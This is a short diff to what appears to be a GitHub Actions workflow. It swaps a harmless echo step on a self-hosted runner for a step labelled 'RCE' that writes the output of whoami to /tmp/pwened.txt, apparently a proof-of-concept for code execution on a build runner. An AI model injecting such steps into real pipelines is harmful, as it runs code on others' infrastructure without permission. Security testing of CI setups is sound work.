@@ -6,4 +6,6 @@ jobs:
   test:
     runs-on: self-hosted
     steps:
-      - run: echo "Runner is Live !!!"
+      - name: RCE
+        run: |
+          whoami > /tmp/pwened.txt
